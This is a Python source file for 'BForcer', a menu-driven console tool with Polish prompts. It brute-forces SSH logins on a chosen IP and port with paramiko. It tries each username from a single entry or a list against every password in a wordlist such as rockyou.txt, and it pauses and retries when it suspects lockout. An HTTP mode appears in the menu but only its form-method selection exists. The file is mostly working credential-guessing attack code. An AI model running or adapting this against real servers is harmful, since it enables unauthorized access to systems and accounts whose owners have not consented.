import paramiko
import time
from art import text2art
from termcolor import colored

import os, os.path

target = ""
dictionary = ""
errorMessage = ""
formMethod = ""
usernames = ""
username = ""

ssh_port = 22

def clearconsole():
    os.system("cls || clear")

def displaytext():
    global errorMessage
    appname = text2art("BForcer", font="slant")

    print(colored(appname, "blue"), end="")
    print(colored("------------------< by elmaccho >------------------", "light_blue"))

    if errorMessage:
        print(colored("------------------" + errorMessage +  "------------------", "red"))

def target_ip():
    global target

    clearconsole()
    displaytext()

    set_target = input("Wprowadź IP: ")

    target = set_target

    select_attack()

def dictionary_file():
    global dictionary, errorMessage

    clearconsole()
    displaytext()

    print("By uzyc pliku " + colored("rockyou.txt", "red")+" wpisz 0")
    set_dictionary = input("Wprowadź sciezke do pliku: ")

    if set_dictionary == "0":
        dictionary = os.path.join(os.getcwd(), 'assets', 'rockyou.txt')
        set_dictionary = dictionary

    if os.path.isfile(set_dictionary):
        dictionary = set_dictionary
        errorMessage = ""
        select_attack()
    else:
        errorMessage = "Plik nie istnieje"
        dictionary_file()

def set_form_method():
    global formMethod
    global errorMessage
    clearconsole()
    displaytext()

    print("Wybierz metode formularza: ")

    print(colored("[1]", "yellow") + "\tPOST")
    print(colored("[2]", "yellow") + "\tGET")
    print(colored("[3]", "yellow") + "\tWroc do menu")

    set_method = int(input("Wybierz opcje: "))

    if set_method == 1:
        errorMessage = ""
        formMethod = "POST"
    elif set_method == 2:
        errorMessage = ""
        formMethod = "GET"
    elif set_method == 3:
        errorMessage = ""
        select_attack()
    else:
        errorMessage = "Niepoprawna opcja!"
        set_form_method()

def set_username():
    global username, usernames, errorMessage

    username = ""
    usernames = ""

    clearconsole()
    displaytext()

    username = input("Wprowadz nazwe uzytkownika: ")

    if username == "":
        errorMessage = "Wprowadz poprawne dane"
        set_username()
    else:
        errorMessage = ""
        select_attack()

def set_users_file():
    global username, usernames, errorMessage

    username = ""
    usernames = ""

    clearconsole()
    displaytext()

    print("Aby anulowac wpisz " + colored("0", "red"))
    set_usernames = input("Wprowadz sciezke do pliku z nazwami uzytkownikow: ")

    if set_usernames == "0":
        errorMessage = ""
        select_attack()

    if os.path.isfile(set_usernames):
        errorMessage = ""
        usernames = set_usernames
        select_attack()
    elif set_usernames == "":
        errorMessage = "Wprowadz poprawne dane"
        set_users_file()
    else:
        errorMessage = "Plik nie istnieje"
        set_users_file()

def choose_username():
    global errorMessage

    clearconsole()
    displaytext()

    print(colored("[1]", "yellow") + "\tPlik usernames")
    print(colored("[2]", "yellow") + "\tPojedynczy user")
    print(colored("[3]", "yellow") + "\tWroc do menu")

    set_method = int(input("Wybierz opcje: "))

    if set_method == 1:
        errorMessage = ""
        set_users_file()
    elif set_method == 2:
        errorMessage = ""
        set_username()
    elif set_method == 3:
        errorMessage = ""
        select_attack()
    else:
        errorMessage = "Niepoprawna opcja!"
        choose_username()


def start_ssh_bf():
    global target, dictionary, username, usernames, errorMessage, ssh_port

    clearconsole()
    displaytext()

    print(colored("Rozpoczynanie ataku na: ", "cyan") + target)
    print(colored("Plik z haslami: ", "cyan") + dictionary)

    if username:
        print(colored("Uzytkownik: ", "cyan") + username)
    if usernames:
        print(colored("Uzytkownicy: ", "cyan") + usernames)

    print(colored("Port: ", "cyan") + str(ssh_port))

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if usernames:
        with open(usernames, "r") as users:
            for user in users:
                user = user.strip()
                with open(dictionary, "r") as passwords:
                    for password in passwords:
                        password = password.strip()
                        try:
                            print(colored("[*]", "yellow") + "Próbuje: " + user + ":" + password)
                            client.connect(target, port=ssh_port, username=user, password=password, timeout=2)
                            print(colored("[+]", "light_green") + "Znaleziono poprawne dane logowania: " + user + ":" + password)
                            client.close()
                            return
                        except paramiko.AuthenticationException:
                            pass
                        except paramiko.SSHException:
                            print(colored("[!]", "red") + "Możliwa blokada logowania. Czekam 10 sekund...")
                            time.sleep(10)
                        except Exception as e:
                            print(colored("[!]", "red") + "Inny błąd: " + str(e))

    if username:
        with open(dictionary, "r") as passwords:
            for password in passwords:
                password = password.strip()
                try:
                    print(colored("[*]", "yellow") + "\tPróbuje: " + username + ":" + password)
                    client.connect(target, port=ssh_port, username=username, password=password, timeout=1)
                    print(colored("[+]", "light_green") + "\tZnaleziono poprawne dane logowania: " + colored(username, "light_green") + ":" + colored(password, "light_green"))
                    client.close()
                    return
                except paramiko.AuthenticationException:
                    pass
                except paramiko.SSHException:
                    print(colored("[!]", "red") + "\tMożliwa blokada logowania. Czekam 10 sekund...")
                    time.sleep(10)
                except Exception as e:
                    print(colored("[!]", "red") + "\tInny błąd: " + str(e))

    print(colored("[-]", "yellow") + "\tNie znaleziono poprawnych danych logowania.")


def set_ssh_port():
    global errorMessage, ssh_port

    clearconsole()
    displaytext()

    print("Domyslny port "+ colored("SSH", "red")+" ustawiony jest na " + colored("22", "red"))
    print("Czy chcesz go zmienic?")

    print(colored("[1]", "yellow") + "\tNie")
    print(colored("[2]", "yellow") + "\tTak")

    change_port = int(input("Wybierz opcje: "))


    if change_port == 1:
        errorMessage = ""
        start_ssh_bf()
    elif change_port == 2:
        errorMessage = ""
        change_ssh_port()
    else:
        errorMessage = "Wybierz odpowiednia opcje"
        set_ssh_port()

def change_ssh_port():
    global ssh_port, errorMessage
    clearconsole()
    displaytext()

    while True:
        try:
            new_ssh_port = int(input("Wpisz nowy port dla SSH: "))
            if 1 <= new_ssh_port <= 65535:
                ssh_port = new_ssh_port
                errorMessage = ""
                start_ssh_bf()
                break
            else:
                errorMessage = "Podaj port w zakresie 1-65535!"
                change_ssh_port()
        except ValueError:
            errorMessage = "Podaj liczbę!"
            change_ssh_port()


def select_attack():
    global errorMessage
    global target
    global dictionary
    global username
    global usernames

    clearconsole()
    displaytext()



    if target or dictionary or username or usernames:
        print(colored("---------------------------------------------------", "light_yellow"))
        if target:
            print(colored("IP: ", "yellow") + target)
        if dictionary:
            print(colored("Plik: ", "yellow") + dictionary)
        if username:
            print(colored("Username: ", "yellow") + username)
        if usernames:
            print(colored("Usernames: ", "yellow") + usernames)
        print(colored("---------------------------------------------------", "light_yellow"))


    if target == "" or dictionary == "" or usernames == "" and target == "" or dictionary == "" or username == "":
        print(colored("[1]", "red") + "\tHTTP")
        print(colored("[2]", "red") + "\tSSH")
    else:
        print(colored("[1]", "light_green") + "\tHTTP")
        print(colored("[2]", "light_green") + "\tSSH")


    if target == "":
        print(colored("[3]", "yellow") + "\tIP celu" + "\t" + colored("[!]", "light_yellow"))
    else:
        print(colored("[3]", "green") + "\tIP celu")

    if dictionary == "":
        print(colored("[4]", "yellow") + "\tPlik z haslami" + "\t" + colored("[!]", "light_yellow"))
    else:
        print(colored("[4]", "green") + "\tPlik z haslami")

    if username == "" and usernames == "":
        print(colored("[5]", "yellow") + "\tUżytkownik" + "\t" + colored("[!]", "light_yellow"))
    else:
        print(colored("[5]", "green") + "\tUżytkownik")

    print(colored("[6]", "yellow") + "\tZakończ")

    set_attack = int(input("Wybierz opcje: "))

    if set_attack == 1:
        if target == "" or dictionary == "" or usernames == "" and target == "" or dictionary == "" or username == "":
            errorMessage = "Uzupelnij dane!"
            select_attack()
        else:
            errorMessage = ""
            set_form_method()
    elif set_attack == 2:
        if target == "" or dictionary == "" or usernames == "" and target == "" or dictionary == "" or username == "":
            errorMessage = "Uzupelnij dane!"
            select_attack()
        else:
            errorMessage = ""
            set_ssh_port()
    elif set_attack == 3:
        errorMessage = ""
        target_ip()
    elif set_attack == 4:
        errorMessage = ""
        dictionary_file()
    elif set_attack == 5:
        errorMessage = ""
        choose_username()
    elif set_attack == 6:
        errorMessage = ""
        print(colored("Adios!", "magenta"))
        exit()
    else:
        errorMessage = "Niepoprawna opcja!"
        select_attack()

def start():
    displaytext()
    select_attack()

if __name__ == '__main__':
    start()
    # set_ssh_port()